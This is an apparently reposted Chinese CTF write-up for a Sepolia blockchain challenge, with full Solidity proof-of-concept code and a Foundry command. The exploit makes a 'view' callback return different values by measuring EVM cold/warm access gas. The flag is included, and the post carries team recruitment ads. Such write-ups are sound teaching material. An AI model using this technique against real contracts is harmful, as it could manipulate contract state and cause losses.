# 封神台CTF blockchain 美梦成真

> 原文: https://www.ctfiot.com/222685.html
> ID: 222685

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

分析：这道题的合约放在了 Sepolia 测试网上，要进行交互，首先要调用 start_challenge()函数，有点像是使用 EOA 账户来开启容器的味道了。

要想 is_solved 函数返回 true 这里要求我们 EOA 对应的wishes mapping的值大于 1。要想修改 wishes 只能通过wish_making函数。调用该函数时会自动调用msg.sender上的wish_amount函数。

function wish_making() external challenge_started remains_wish {
 Wish_Maker wish_maker = Wish_Maker(msg.sender);
 bool is_less_than = false;
 if (wish_maker.wish_amount() < 1) {
 is_less_than = true;
 }
 wish_made[tx.origin] = true;
 if (is_less_than) {
 wishes[tx.origin] = wish_maker.wish_amount();
 } else {
 wishes[tx.origin]--;
 }
}

要想满足 is_solved 的条件，我们需要当 target 第一次调用我们攻击合约的 wish_amount 时，第一次返回的是 0，第二次返回的值大于 1。但是，由于接口的定义，wish_amount函数是一个 view 函数。通过常规的方法无法修改，但是我们可以利用 evm 冷读热的的特点进行绕过

当第一次访问一个地址时，这个地址是冷读，消耗的 gas 为 2600，但是第二次访问这个地址时，就变成了热读，消耗的 gas 仅有 100。所以我们可以对攻击合约中的 wish_amount 函数进行如下构造：

function wish_amount() external view returns (uint256) {
	uint256 startGas = gasleft();
	uint256 bal = address(0x100).balance;
	uint256 usedGas = startGas - gasleft();
	if (usedGas < 1000) {
 return 2;
	}
	return 0;
}

完整 Poc

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Make_a_wish} from "../src/Make_a_wish.sol";
import {Wish_Maker} from "../src/Make_a_wish.sol";

contract Poc is Wish_Maker {
 function wish_amount() external view returns (uint256) {
 uint256 startGas = gasleft();
 uint256 bal = address(0x100).balance;
 uint256 usedGas = startGas - gasleft();
 if (usedGas < 1000) {
 return 2;
 }
 return 0;
 }

 function attack() external {
 Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);
 target.start_challenge();
 target.wish_making();
 require(target.is_solved(address(tx.origin)), "hack failed");
 }
}

contract Attack is Script {
 function run() public {
 vm.startBroadcast();
 Poc poc = new Poc();
 poc.attack();
 vm.stopBroadcast();
 }
}

执行 foundry 命令即可：

forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun

account：0xDf996e6b09A5f1dc4da8365148e7e8D52e8fD892

flag：flag{v1ew_K3yword_7rouble}

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
function wish_making() external challenge_started remains_wish {
 Wish_Maker wish_maker = Wish_Maker(msg.sender);
 bool is_less_than = false;
 if (wish_maker.wish_amount() < 1) {
 is_less_than = true;
 }
 wish_made[tx.origin] = true;
 if (is_less_than) {
 wishes[tx.origin] = wish_maker.wish_amount();
 } else {
 wishes[tx.origin]--;
 }
}
```



```
function wish_amount() external view returns (uint256) {
	uint256 startGas = gasleft();
	uint256 bal = address(0x100).balance;
	uint256 usedGas = startGas - gasleft();
	if (usedGas < 1000) {
 return 2;
	}
	return 0;
}
```



```
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Make_a_wish} from "../src/Make_a_wish.sol";
import {Wish_Maker} from "../src/Make_a_wish.sol";

contract Poc is Wish_Maker {
 function wish_amount() external view returns (uint256) {
 uint256 startGas = gasleft();
 uint256 bal = address(0x100).balance;
 uint256 usedGas = startGas - gasleft();
 if (usedGas < 1000) {
 return 2;
 }
 return 0;
 }

 function attack() external {
 Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);
 target.start_challenge();
 target.wish_making();
 require(target.is_solved(address(tx.origin)), "hack failed");
 }
}

contract Attack is Script {
 function run() public {
 vm.startBroadcast();
 Poc poc = new Poc();
 poc.attack();
 vm.stopBroadcast();
 }
}
```



```
forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1736125624.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/0-1736125626.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1736125627.webp)